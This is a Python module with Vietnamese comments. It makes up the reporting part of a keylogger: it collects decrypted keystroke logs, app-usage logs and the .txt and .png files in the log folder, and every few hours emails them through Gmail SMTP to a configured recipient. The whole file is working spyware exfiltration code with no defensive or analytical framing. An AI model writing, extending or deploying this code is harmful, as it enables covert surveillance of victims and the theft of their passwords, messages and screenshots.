import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
import os
from datetime import datetime
import schedule
import time
import json
from cryptography.fernet import Fernet
import base64

class EmailReporter:
    def __init__(self, log_dir="logs"):
        self.log_dir = log_dir
        self.config_file = os.path.join(log_dir, "email_config.json")
        self.encryption_key = None
        self.cipher_suite = None
        
        # Khởi tạo cấu hình email
        self.init_email_config()
        
    def init_email_config(self):
        """Khởi tạo hoặc tải cấu hình email"""
        if not os.path.exists(self.config_file):
            config = {
                'smtp_server': 'smtp.gmail.com',
                'smtp_port': 587,
                'sender_email': 'your-email@gmail.com',
                'sender_password': 'your-app-password',
                'receiver_email': 'receiver@example.com',
                'report_interval': 24  # Giờ
            }
            with open(self.config_file, 'w') as f:
                json.dump(config, f)
            print(f"Đã tạo file cấu hình email tại: {self.config_file}")
            print("Vui lòng cập nhật thông tin email trong file cấu hình")
            
    def load_config(self):
        """Tải cấu hình email"""
        with open(self.config_file, 'r') as f:
            return json.load(f)
            
    def prepare_report(self):
        """Chuẩn bị nội dung báo cáo"""
        report = f"Báo cáo Keylogger - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
        
        # Thêm thống kê keylog
        keylog_file = os.path.join(self.log_dir, "decrypted_keylog.txt")
        if os.path.exists(keylog_file):
            with open(keylog_file, 'r') as f:
                report += "=== Keylog ===\n"
                report += f.read() + "\n\n"
                
        # Thêm thống kê app usage
        app_log_file = os.path.join(self.log_dir, "decrypted_app_usage.txt")
        if os.path.exists(app_log_file):
            with open(app_log_file, 'r') as f:
                report += "=== App Usage ===\n"
                report += f.read() + "\n\n"
                
        return report
        
    def send_report(self):
        """Gửi báo cáo qua email"""
        try:
            config = self.load_config()
            
            # Tạo message
            msg = MIMEMultipart()
            msg['From'] = config['sender_email']
            msg['To'] = config['receiver_email']
            msg['Subject'] = f"Keylogger Report - {datetime.now().strftime('%Y-%m-%d')}"
            
            # Thêm nội dung báo cáo
            report = self.prepare_report()
            msg.attach(MIMEText(report, 'plain'))
            
            # Thêm file đính kèm
            for filename in os.listdir(self.log_dir):
                if filename.endswith('.txt') or filename.endswith('.png'):
                    filepath = os.path.join(self.log_dir, filename)
                    with open(filepath, 'rb') as f:
                        part = MIMEApplication(f.read(), Name=filename)
                        part['Content-Disposition'] = f'attachment; filename="{filename}"'
                        msg.attach(part)
            
            # Gửi email
            with smtplib.SMTP(config['smtp_server'], config['smtp_port']) as server:
                server.starttls()
                server.login(config['sender_email'], config['sender_password'])
                server.send_message(msg)
                
            print(f"Đã gửi báo cáo đến {config['receiver_email']}")
            
        except Exception as e:
            print(f"Lỗi khi gửi báo cáo: {e}")
            
    def start_scheduled_reports(self):
        """Bắt đầu gửi báo cáo định kỳ"""
        config = self.load_config()
        schedule.every(config['report_interval']).hours.do(self.send_report)
        
        print(f"Bắt đầu gửi báo cáo mỗi {config['report_interval']} giờ")
        while True:
            schedule.run_pending()
            time.sleep(60)
            
if __name__ == "__main__":
    reporter = EmailReporter()
    reporter.start_scheduled_reports() 